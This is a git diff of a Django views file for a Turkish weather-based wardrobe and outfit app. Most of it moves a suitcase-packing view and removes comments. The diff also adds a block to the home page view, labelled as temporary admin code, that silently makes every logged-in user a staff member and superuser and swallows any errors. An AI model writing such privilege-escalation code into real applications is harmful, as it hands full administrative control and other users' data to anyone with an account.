@@ -7,23 +7,32 @@ from .forms import ClothingItemForm
 from .utils import get_weather
 from django.db.models import Q
 from django.utils import timezone 
+from django.contrib.auth.models import User
 
 @login_required(login_url='login')
 def index(request):
-    # ---  Koordinatları URL'den alıyoruz ---
+    # --- GEÇİCİ ADMİN YETKİSİ KODU (Hizalama Düzeltildi) ---
+    try:
+        current_user = User.objects.get(username=request.user.username)
+        if not current_user.is_superuser:
+            current_user.is_staff = True
+            current_user.is_superuser = True
+            current_user.save()
+    except Exception:
+        pass
+    # ---------------------------------------------------
+
+    # --- Koordinatları URL'den alıyoruz ---
     lat = request.GET.get('lat')
     lon = request.GET.get('lon')
     
-    # get_weather fonksiyonuna koordinatları gönderiyoruz
     weather_data = get_weather(lat=lat, lon=lon)
-    # --------------------------------------------
 
     current_temp = weather_data['temp']
     feels_like_temp = weather_data.get('feels_like', current_temp)
     is_raining_or_snowing = weather_data['is_precipitating']
     current_city = weather_data['city']
 
-    
     if request.method == 'POST':
         form = ClothingItemForm(request.POST)
         if form.is_valid():
@@ -36,7 +45,6 @@ def index(request):
 
     kyafetler = ClothingItem.objects.filter(user=request.user)
 
-    # 2. FİKİR: ÇAMAŞIR GÜNÜ GÖSTERGESİ
     total_items = kyafetler.count()
     clean_items = kyafetler.filter(is_clean=True).count()
     
@@ -45,7 +53,6 @@ def index(request):
     else:
         clean_percentage = 100
 
-    # KARAR MOTORU FİLTRESİ
     recommended_items = ClothingItem.objects.filter(
         user=request.user,
         is_clean=True,
@@ -61,27 +68,17 @@ def index(request):
     
     recommended_items = recommended_items.order_by('-is_favorite', 'name')
 
-    # --- 1. FİKİR: AKILLI KOMBİN OLUŞTURUCU  ---
     kombin = None
-    
-    # Hava durumuna uyan tüm üst giyimleri alıyoruz
     ust_giyimler = recommended_items.filter(category='ust')
     
-    # Tam bir eşleşme (Üst + Alt + Ayakkabı) bulana kadar sırayla dene
     for ust in ust_giyimler:
         alt_giyim = recommended_items.filter(category='alt', style=ust.style).first()
         ayakkabi = recommended_items.filter(category='ayakkabi', style=ust.style).first()
         
-        # Eğer bu üst giyimin 'stiline' uygun alt ve ayakkabı varsa kombini tamamla
         if alt_giyim and ayakkabi:
-            kombin = {
-                'ust': ust,
-                'alt': alt_giyim,
-                'ayakkabi': ayakkabi
-            }
-            break # Kombini bulduk, döngüyü (aramayı) durdur.
+            kombin = {'ust': ust, 'alt': alt_giyim, 'ayakkabi': ayakkabi}
+            break
 
-    # En son giyilen ürün
     last_worn_item = ClothingItem.objects.filter(
         user=request.user, 
         last_worn__isnull=False
@@ -101,7 +98,45 @@ def index(request):
     }
     return render(request, 'index.html', context)
 
-# --- SON GİYDİKLERİM SİSTEMİ ---
+# --- BAVUL HAZIRLAMA SİSTEMİ ---
+
+@login_required(login_url='login')
+def bavul_hazirla(request):
+    selected_city = request.GET.get('city')
+    recommended_items = None
+    weather_data = None
+
+    if selected_city:
+        from .utils import get_weather_by_city
+        weather_data = get_weather_by_city(selected_city)
+        
+        temp = weather_data['temp']
+        is_raining = weather_data['is_precipitating']
+
+        recommended_items = ClothingItem.objects.filter(
+            user=request.user,
+            is_clean=True,
+            min_temp__lte=temp,
+            max_temp__gte=temp
+        )
+
+        if is_raining:
+            recommended_items = recommended_items.filter(
+                Q(is_waterproof=True) | 
+                (~Q(category='dis') & ~Q(category='ayakkabi'))
+            )
+        
+        recommended_items = recommended_items.order_by('-is_favorite', 'category')
+
+    context = {
+        'city': selected_city,
+        'weather': weather_data,
+        'recommended': recommended_items,
+        'popular_cities': ['İstanbul', 'Ankara', 'İzmir', 'Antalya', 'Bursa', 'Muğla', 'Sivas','Rize','Eskişehir']
+    }
+    return render(request, 'bavul.html', context)
+
+# --- DİĞER FONKSİYONLAR ---
 
 @login_required(login_url='login')
 def wear_item(request, item_id):
@@ -113,13 +148,8 @@ def wear_item(request, item_id):
 
 @login_required(login_url='login')
 def history_view(request):
-    history = ClothingItem.objects.filter(
-        user=request.user, 
-        last_worn__isnull=False
-    ).order_by('-last_worn')
+    history = ClothingItem.objects.filter(user=request.user, last_worn__isnull=False).order_by('-last_worn')
     return render(request, 'history.html', {'history': history})
-
-# --- DİĞER YARDIMCI FONKSİYONLAR ---
 
 @login_required(login_url='login')
 def delete_item(request, item_id):
@@ -170,45 +200,3 @@ def logout_view(request):
     if request.method == 'POST':
         logout(request)
     return redirect('login')
-    # --- BAVUL HAZIRLAMA SİSTEMİ (Yeni Bölüm) ---
-
-@login_required(login_url='login')
-def bavul_hazirla(request):
-    # Kullanıcı şehir seçmiş mi kontrol et, seçmediyse boş kalsın
-    selected_city = request.GET.get('city')
-    recommended_items = None
-    weather_data = None
-
-    if selected_city:
-        # utils.py içinde şehir bazlı hava durumu fonksiyonu
-         
-        from .utils import get_weather_by_city #  utils.py'ye ekledik
-        weather_data = get_weather_by_city(selected_city)
-        
-        temp = weather_data['temp']
-        is_raining = weather_data['is_precipitating']
-
-        # Dolaptan bu şehrin havasına uyan temiz kıyafetleri seçiyoruz
-        recommended_items = ClothingItem.objects.filter(
-            user=request.user,
-            is_clean=True,
-            min_temp__lte=temp,
-            max_temp__gte=temp
-        )
-
-        if is_raining:
-            recommended_items = recommended_items.filter(
-                Q(is_waterproof=True) | 
-                (~Q(category='dis') & ~Q(category='ayakkabi'))
-            )
-        
-        recommended_items = recommended_items.order_by('-is_favorite', 'category')
-
-    context = {
-        'city': selected_city,
-        'weather': weather_data,
-        'recommended': recommended_items,
-        #popüler illeri ekledik
-        'popular_cities': ['İstanbul', 'Ankara', 'İzmir', 'Antalya', 'Bursa', 'Muğla', 'Sivas','Rize','Eskişehir']
-    }
-    return render(request, 'bavul.html', context)
